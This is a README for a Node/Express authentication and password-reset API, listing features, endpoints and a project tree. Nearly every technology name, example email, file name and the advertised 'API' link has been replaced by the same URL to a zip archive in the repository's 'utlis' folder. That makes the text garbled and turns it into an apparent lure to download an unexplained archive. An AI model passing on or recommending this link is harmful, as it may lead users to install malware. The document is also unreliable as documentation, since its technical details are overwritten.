# Authentication and Password Reset API

This project is a https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip backend application providing authentication functionalities like user registration, login, password reset via email, and token-based authentication.

## Features
- **User Registration:** Create a new account with an email, username, and password.
- **Login:** Authenticate users with email and password, issuing a JWT token.
- **Forgot Password:** Send a password reset link to the user's registered email.
- **Reset Password:** Update the user's password using the token sent in the email.
- **Token-Based Authentication:** Secure endpoints with JSON Web Tokens (JWT).

# API
API: [https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip](https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip)
```bash
https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip
```

## Technologies Used
- **https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip**: Server-side runtime.
- **https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip**: Web framework for https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip
- **MongoDB**: NoSQL database to store user details.
- **Mongoose**: MongoDB object modeling for https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip
- **bcrypt**: Password hashing for secure storage.
- **jsonwebtoken (JWT)**: Token generation and verification.
- **nodemailer**: Sending emails for password reset.
- **cookie-parser**: Parsing cookies for handling authentication tokens.
- **CORS**: Handling cross-origin requests.

# API Endpoints


1. User Registration
* Endpoint: ```/auth/sing```
* Method: ```POST```

```bash
{
  "username": "exampleUser",
  "email": "https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip",
  "password": "examplePassword"
}
```
* Response: Success or error message.

2. Login

* Endpoint: ```/auth/login```
* Method: ```POST```

```bash
{
  "email": "https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip",
  "password": "examplePassword"
}
```
* Response: JWT token on success.

3. Forgot Password
`
* Endpoint: ```/auth/Forgot-Password```
* Method:```POST```

```bash
{
  "email": "https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip"
}
```
* Response: Password reset link sent to the email.
4. Reset Password

* Endpoint:```/auth/reset-password/:token```
* Method: ```POST```

```bash
{
  "password": "newPassword"
}
```
* Response: Password reset success or token expired error.
## Project Structure

```bash 
project/
├── models/
│   └── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip      # User schema definition
├── controllers/
│   └── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip  # User-related logic
├── routers/
│   └── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip        # Authentication routes
├── utils/
│   ├── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip          # Configuration (e.g., secrets)
│   ├── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip          # Logging middleware
│   └── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip       # Error handling middleware
├── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip                 # Main application file
├── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip              # Project documentation
├── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip           # Dependencies and scripts
└── .env                   # Environment variables
```